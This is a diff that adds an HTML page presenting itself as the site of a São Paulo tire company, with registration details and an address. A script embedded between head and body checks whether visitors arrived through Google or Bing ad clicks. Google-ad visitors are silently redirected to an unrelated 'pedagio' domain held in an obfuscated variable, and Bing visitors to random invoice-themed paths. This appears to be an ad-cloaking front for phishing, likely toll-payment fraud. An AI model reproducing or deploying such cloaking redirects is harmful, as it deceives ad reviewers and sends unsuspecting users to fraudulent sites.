@@ -1,1 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pneus Roma LTDA</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #eef2f7;
+      color: #333;
+    }
 
+    nav {
+      background-color: #1a1a1a;
+      padding: 15px;
+      text-align: center;
+    }
+
+    nav a {
+      color: white;
+      margin: 0 15px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .banner {
+      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),
+                  url('https://images.unsplash.com/photo-1519750783826-e2420f4d687f');
+      background-size: cover;
+      background-position: center;
+      color: white;
+      padding: 80px 20px;
+      text-align: center;
+    }
+
+    .container {
+      padding: 30px;
+      max-width: 1000px;
+      margin: auto;
+    }
+
+    .card {
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      margin-top: 0;
+      color: #1a1a1a;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+    }
+
+    footer {
+      background-color: #1a1a1a;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      margin-top: 30px;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 10px 15px;
+      background-color: #007bff;
+      color: white;
+      border-radius: 5px;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+  <script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www2-pedagio.digital/3289/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<nav>
+  <a href="#">Início</a>
+  <a href="#empresa">Empresa</a>
+  <a href="#contato">Contato</a>
+  <a href="#localizacao">Localização</a>
+</nav>
+
+<div class="banner">
+  <h1>Comercial de Pneus Roma LTDA</h1>
+  <p>Tradição e confiança há mais de 50 anos</p>
+</div>
+
+<div class="container">
+
+  <div id="empresa" class="card">
+    <h2>Sobre a Empresa</h2>
+    <p><strong>CNPJ:</strong> 61.721.320/0001-25</p>
+    <p><strong>Razão Social:</strong> Comercial de Pneus Roma LTDA</p>
+    <p><strong>Fundação:</strong> 20/12/1968</p>
+    <p><strong>Natureza Jurídica:</strong> Sociedade Empresária Limitada</p>
+    <p><strong>Capital Social:</strong> R$ 2.500.000,00</p>
+    <p><strong>Status:</strong> Ativa</p>
+  </div>
+
+  <div class="grid">
+
+    <div id="contato" class="card">
+      <h2>Contato</h2>
+      <p>Email: fe****@****.net</p>
+      <p>Telefone: (11) 383****-****</p>
+      <p>Telefone: (11) 337****-****</p>
+      <a href="#" class="btn">Fale Conosco</a>
+    </div>
+
+    <div id="localizacao" class="card">
+      <h2>Localização</h2>
+      <p>Av. Antonio Estevao de Carvalho, 2644</p>
+      <p>Sala 2 - Cidade Patriarca</p>
+      <p>São Paulo - SP</p>
+      <p>CEP: 03540-200</p>
+    </div>
+
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2026 Pneus Roma LTDA - Todos os direitos reservados</p>
+</footer>
+
+</body>
+</html>
